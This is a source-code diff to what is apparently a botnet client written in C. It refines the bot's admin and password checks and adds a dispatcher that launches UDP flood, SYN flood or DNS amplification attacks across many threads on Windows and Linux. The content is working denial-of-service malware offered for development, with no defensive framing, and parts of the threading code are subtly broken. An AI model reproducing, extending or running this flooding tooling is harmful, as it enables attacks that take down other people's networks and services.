@@ -51,7 +51,7 @@
  * return TRUE if correct else
  * return FALSE
  */
-int check_pass (char *pass) {
+int check_pass (const char *pass) {
     if (strncmp (pass, BOT_PWORD, strlen (BOT_PWORD)) == 0) {
         return TRUE;
     }
@@ -111,7 +111,7 @@ int add_admin (pAccount a, pMessage m) {
 bool is_admin (pAccount a, pMessage m) {
     int i;
     for (i = 0; i < a->num_admins; i++) {
-        if (strcmp (m->n_name, a->admins[i])) {
+        if (strcmp (m->n_name, a->admins[i]) == 0) {
             return TRUE;
         }
     }
@@ -125,7 +125,7 @@ bool is_admin (pAccount a, pMessage m) {
  * return TRUE if it is
  * else FALSE
  */
-bool is_dos (char *cmd) {
+bool is_dos (const char *cmd) {
     if (strcmp (cmd, "$udp") == 0) {
         return TRUE;
     } else if (strcmp (cmd, "$syn") == 0) {
@@ -135,6 +135,10 @@ bool is_dos (char *cmd) {
     return FALSE;
 }
 
+/*
+ * function to initialise 
+ * thread arguments
+ */
 static thr_args *new_thr_args (SOCKET s) {
     thr_args *ta = malloc (sizeof (*ta));
 
@@ -146,6 +150,22 @@ static thr_args *new_thr_args (SOCKET s) {
     ta->time = 0;
 
     return ta;
+}
+
+/*
+ * function to retrieve
+ * appropriate flood function
+ */
+static void *(*get_flood_function (const char *f)) (void *) {
+    if (strcmp (f, "$udp") == 0) {
+        return &udp_flood;
+    } else if (strcmp (f, "$syn") == 0) {
+        return &syn_flood;
+    } else if (strcmp (f, "$dns") == 0) {
+        return &dns_amp;
+    }
+
+    return NULL;
 }
 
 /*
@@ -185,11 +205,11 @@ int parse_args (SOCKET s, pMessage m) {
     // argument count
     argc = i;
 
-    if (argc < DEFAULT_ARG_SIZE-1) {
+    if (argc < DEFAULT_ARG_SIZE-2) {
         return FALSE;
     }
 
-    int opt;
+    int opt = 0;
     thr_args *ta = new_thr_args (s);
     ta->contact = m->contact;
 
@@ -208,35 +228,36 @@ int parse_args (SOCKET s, pMessage m) {
             case 't':
                 ta->time = atoi (optarg);
                 break;
-            default:
-            	return FALSE;
         }
     }
 
+    // function pointer to get appropriate function
+    void *(*flood_func)(void *) = get_flood_function (argv[0]);
+
+    printf ("i: %d, thrds: %d\n", i, ta->threads);
     // thread flood routine
     for (i = 0; i < ta->threads; i++) {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
-        // CreateThread goes here
-        DWORD thr_id;
+        DWORD thr_id[ta->threads];
         HANDLE hThr;
-        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)&udp_flood, ta, 0, &thr_id);
+        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)flood_func, ta, 0, thr_id[i]);
         if (hThr == NULL) {
             fatal ("Thread flooder");
-    }
+        }
 
 #elif defined(__linux__)
 
-        pthread_t thr;
-        if (pthread_create (&thr, NULL, udp_flood, ta)) {
+        pthread_t thr[ta->threads];
+        if (pthread_create (&thr[i], NULL, flood_func, ta)) {
             fatal ("Thread flooder");
         }
-        if (pthread_join (thr, NULL)) {
+        if (pthread_join (thr[i], NULL)) {
             fatal ("Join thread flooder");
         }
 
 #endif
-        printf ("Spawned thread [%d]\n", i);
+        printf ("Spawned thread [%d]\n", i+1);
     }
 
     free (argv);
